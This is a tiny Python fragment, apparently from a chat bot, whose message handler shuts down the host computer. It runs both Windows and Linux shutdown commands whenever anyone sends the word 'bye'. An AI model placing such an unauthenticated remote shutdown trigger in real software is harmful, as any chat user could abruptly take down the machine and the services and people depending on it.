@React.listen()
async def on_message(msg):
    if str(msg.content) == "bye":
        os.system("shutdown /s /t 0")
        os.system("shutdown -h now")